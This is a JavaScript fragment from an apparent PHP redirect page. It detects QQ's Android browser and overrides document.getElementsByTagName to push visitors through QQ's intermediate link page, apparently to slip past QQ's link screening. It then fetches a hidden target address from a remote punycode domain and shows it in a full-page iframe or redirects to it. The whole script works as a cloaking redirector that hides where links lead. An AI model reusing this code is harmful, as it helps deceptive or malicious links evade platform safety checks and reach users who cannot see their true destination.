 var u = navigator.userAgent;
        var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1;
        if (navigator.userAgent.indexOf("QQ/") > -1 && isAndroid == true) {
            var Zeptoq = document.getElementsByTagName;
            document.getElementsByTagName = function(a) {
                if (a == 'meta') {
                    window.location.href = "https://c.pc.qq.com/middleb.html?pfurl=<?php echo $res['dwz'] ?>";
                    return;
                } else {
                    return Zeptoq.call(document, a);
                }
            };
        }

        $(document).ready(function() {
            function getQueryVariable(variable) {
				var query = window.location.search.substring(1);
				var vars = query.split("&");
				for (var i = 0; i < vars.length; i++) {
					var pair = vars[i].split("=");
					if (pair[0] == variable) {
						return pair[1];
					}
				}
				return (false);
			}
            
            var u = getQueryVariable('u');
            $.ajax({
                url: "https://xn--45q93bf3rk83b.net/github.php?act=geturl&u="+u,
                type: "get",
                dataType: "json",
                success: function(result) {
                    if (result.code == 1 &&result.pattern>2) {
                        $('#Zl').html('<iframe width="100%" id="rid" src="' + result.url + '" frameborder="0"></iframe>');
                        $(window).resize(function() {
                            fix_height();
                        }).resize();
                    } else {
                        $('#Zl').html('<iframe width="100%" height="100%" id="rid" src="https://www.baidu.com" frameborder="0"></iframe>');
                    }
		   if (result.code == 1 &&result.pattern<3) {
		   	 window.location =result.url;
		   }
                },
                error: function(data) {
                    $('#Zl').html('<iframe width="100%" height="100%" id="rid" src="https://www.baidu.com" frameborder="0"></iframe>');
                }
            });
        });
        if (! /*@aijquery@*/ 0) {
            $("#rid").onload = function() {
                fix_height();
                $("#rid").contentWindow.focus();
                $("#rid").load(function() {
                    $('body').css('background', '');
                });
            };
        } else {
            $("#rid").onreadystatechange = function() {
                if ($("#rid").readyState == "complete") {
                    fix_height();
                    $("#rid").contentWindow.focus();
                    $("#rid").load(function() {
                        $('body').css('background', '');
                    });
                }
            };
        }

        function fix_height() {
            $("#rid").attr("height", (($(window).height()) - 5) + "px");
        }